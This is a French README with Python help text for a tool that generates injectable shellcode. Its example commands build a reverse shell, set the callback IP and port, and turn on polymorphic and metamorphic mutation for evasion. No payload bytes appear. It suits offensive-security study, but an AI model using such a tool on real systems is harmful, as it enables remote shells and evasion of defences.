# security_shellcode

Création automatique d'un shellcode à injecter dans un programme (programme C directement disponible dans le git).

def exemple():
    print("<---------------------------------------- EXEMPLES ---------------------------------------->")
    print("Exemple : python "+sys.argv[0] +
          " -s ../final/asm/fnl_reverse_shell.asm " +
          "\n//     Retourne le shellcode     \\\\")
    print("Exemple : python "+sys.argv[0] +
          " -c ../final/c/fnl_reverse_shell.c " +
          "\n//     Compile et lance le programme     \\\\")
    print("Exemple : python "+sys.argv[0] +
          " -c -s ../final/asm/fnl_reverse_shell.asm " +
          "\n//     Compile et lance le programme avec le shellcode du fichier.asm     \\\\")
    print("Exemple : python "+sys.argv[0] +
          " -p 4444 -s ../final/asm/fnl_reverse_shell.asm " +
          "\n//     Retourne le shellcode du fichier en changeant le port     \\\\")
    print("Exemple : python "+sys.argv[0] +
          " -i 127.0.0.1 -s ../final/asm/fnl_reverse_shell.asm " +
          "\n//     Retourne le shellcode du fichier en changeant l'ip     \\\\")
    print("Exemple : python "+sys.argv[0] +
          " -c -s ../final/asm/fnl_reverse_shell.asm -i 127.0.0.1 -p 4444 " +
          "\n//     Compile et lance le programme avec le shellcode du fichier.asm en changeant l'ip et le port     \\\\")
    print("Exemple : python "+sys.argv[0] +
          " -c -s ../final/asm/fnl_reverse_shell.asm -i 127.0.0.1 -p 4444 -v -M -P" +
          "\n//     Compile et lance le programme avec le shellcode du fichier.asm en changeant l'ip et le port avec le polymorphisme et le metamorphisme activé   \\\\")
    print("<---------------------------------------- EXEMPLES ---------------------------------------->")


def help():
    print("<------------------------------------------ HELP ------------------------------------------>")
    print("-h Affiche ce message")
    print("-e Affiche des exemples de commandes")
    print("-v Active le mode verbosité")
    print("-vvv Active le mode haute verbosité (objdump)")
    print("-s Création de lu shellcode")
    print("-c compile un fichier.c et le lance")
    print("-i Changement de l'ip dans le shellCode")
    print("-p Changement du port dans le shellCode")
    print("-M Activation du metamorphisme du shellcode")
    print("-P Activation du polymorphisme du shellcode")
    print("<------------------------------------------ HELP ------------------------------------------>")
    exit()


